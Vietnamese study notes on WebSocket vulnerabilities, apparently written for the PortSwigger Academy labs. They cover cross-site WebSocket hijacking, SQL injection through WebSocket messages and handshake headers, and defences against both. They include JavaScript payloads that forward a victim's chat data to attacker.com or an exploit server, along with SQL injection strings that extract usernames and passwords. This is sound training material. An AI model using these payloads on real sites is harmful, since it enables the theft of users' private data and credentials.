# WEBSOCKETS — KIẾN THỨC TỔNG HỢP & STEP BY STEP

## Mục lục
1. [WebSocket là gì?](#1-websocket-là-gì)
2. [Các lỗ hổng WebSocket thường gặp](#2-các-lỗ-hổng-websocket-thường-gặp)
3. [Cross-site WebSocket hijacking (CSWSH)](#3-cross-site-websocket-hijacking-cswsh)
4. [Cách phòng chống](#4-cách-phòng-chống)
5. [Lab step-by-step](#5-lab-step-by-step)

## 1. WebSocket là gì?

WebSocket là giao thức cho phép giao tiếp 2 chiều (full-duplex) liên tục giữa trình duyệt và server qua 1 kết nối TCP duy nhất, dùng nhiều cho chat, live update. Kết nối bắt đầu bằng 1 HTTP handshake (`Upgrade: websocket`), sau đó chuyển sang giao thức WebSocket thuần.

## 2. Các lỗ hổng WebSocket thường gặp

- **Input validation như HTTP thông thường:** dữ liệu gửi qua WebSocket message vẫn có thể chứa injection (SQLi, XSS...) nếu backend xử lý không an toàn — mọi kỹ thuật injection đã học ở các topic khác đều áp dụng được, chỉ khác kênh truyền tải.
- **Thiếu xác thực lại trên kết nối WebSocket:** nếu WebSocket handshake không được xác thực đúng cách (chỉ dựa vào cookie tại thời điểm connect mà không re-verify), có thể bị lợi dụng tương tự session hijacking.
- **Cross-site WebSocket hijacking (CSWSH):** tương tự CSRF nhưng cho WebSocket.

## 3. Cross-site WebSocket hijacking (CSWSH)

Xảy ra khi:
1. Server xác thực kết nối WebSocket **chỉ dựa vào cookie** (giống HTTP thông thường), không có thêm token CSRF-like riêng cho WebSocket.
2. Server **không kiểm tra header `Origin`** của request handshake ban đầu.

→ Attacker lừa nạn nhân (đã đăng nhập) truy cập trang độc hại, JS trên trang đó tự mở kết nối WebSocket tới server victim (trình duyệt tự đính kèm cookie session của nạn nhân, giống mọi request cross-site khác), đọc/gửi dữ liệu qua kết nối này thay mặt nạn nhân:

```html
<script>
  var ws = new WebSocket('wss://victim-website.com/chat');
  ws.onopen = function() {
    ws.send('READY');
  };
  ws.onmessage = function(event) {
    fetch('https://attacker.com/log?data=' + event.data);
  };
</script>
```

## 4. Cách phòng chống

- Validate header `Origin` trong request handshake WebSocket, chỉ chấp nhận origin đã whitelist.
- Không chỉ dựa vào cookie để xác thực kết nối WebSocket — dùng thêm token (CSRF-like) được gửi tường minh trong message đầu tiên sau khi kết nối, verify token đó khớp với session.
- Áp dụng input validation đầy đủ cho mọi dữ liệu nhận qua WebSocket message, tương tự HTTP request thông thường.

## 5. Lab step-by-step

### Lab 1: Manipulating WebSocket messages to exploit vulnerabilities
**Mục tiêu:** Chèn payload SQLi qua message WebSocket của chức năng chat.
- **B1:** Vào chức năng live chat, dùng Burp Proxy (tab **WebSockets history**) quan sát message gửi đi dạng JSON/text đơn giản, ví dụ: `READY`.
- **B2:** Trong Burp, chọn message này, dùng **"Edit and resend"** để sửa nội dung, chèn payload SQLi vào trường tin nhắn nếu backend dùng nó để truy vấn (ví dụ chức năng tìm kiếm lịch sử chat theo username):
  ```
  ' UNION SELECT username, password FROM users--
  ```
- **B3:** Gửi message đã sửa qua WebSocket, quan sát response trả về (message tiếp theo từ server) có chứa dữ liệu bị lộ hay không → lab solved khi trích xuất được dữ liệu mục tiêu.

### Lab 2: Manipulating the WebSocket handshake to exploit vulnerabilities
**Mục tiêu:** Header trong request handshake ban đầu (không phải message) bị inject — ví dụ SQLi qua header `Cookie` dùng để xác định user trong chat.
- **B1:** Bắt request handshake `GET /chat` có header `Upgrade: websocket`, quan sát các header khác (`Cookie`, custom header) được server dùng để truy vấn thông tin user.
- **B2:** Sửa giá trị cookie/header trong chính request handshake (dùng Burp Repeater gửi lại request handshake đã sửa) chèn payload SQLi:
  ```
  Cookie: session=xyz'; SELECT ...--
  ```
- **B3:** Server dùng giá trị này ngay khi thiết lập kết nối (trước khi có message nào được gửi) → nếu dễ tổn thương, dữ liệu bị lộ ngay trong response/message đầu tiên → lab solved.

### Lab 3: Cross-site WebSocket hijacking
**Mục tiêu:** Đánh cắp lịch sử chat của nạn nhân bằng CSWSH.
- **B1:** Xác nhận: request handshake WebSocket chỉ dựa vào cookie session, không có token riêng, và **không kiểm tra header `Origin`** (thử đổi Origin trong Burp Repeater khi gửi lại handshake, vẫn kết nối thành công).
- **B2:** Soạn payload trên Exploit Server, tự mở kết nối WebSocket tới server victim và forward toàn bộ dữ liệu nhận được ra ngoài:
  ```html
  <script>
    var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
      ws.send('READY');
    };
    ws.onmessage = function(event) {
      fetch('https://EXPLOIT-ID.exploit-server.net/log?data=' + encodeURIComponent(event.data));
    };
  </script>
  ```
- **B3:** Store, Deliver exploit tới victim — khi nạn nhân (đã đăng nhập, có lịch sử chat) mở trang chứa payload, kết nối WebSocket tự động dùng cookie của họ, server gửi lại lịch sử chat cá nhân qua kết nối này.
- **B4:** Kiểm tra **Access log** trên Exploit Server, đọc được nội dung lịch sử chat (chứa thông tin nhạy cảm) của nạn nhân bị đánh cắp → lab solved.

## Tổng kết
- WebSocket message vẫn cần áp dụng đầy đủ tư duy kiểm thử injection như HTTP thông thường (dùng tab **WebSockets history** trong Burp Proxy để quan sát & "Edit and resend").
- CSWSH là biến thể CSRF quan trọng cần luôn kiểm tra: xác thực chỉ dựa cookie + không check Origin = nguy cơ cao.
- Cả header trong handshake lẫn nội dung message sau khi kết nối đều là bề mặt tấn công cần kiểm thử riêng biệt.

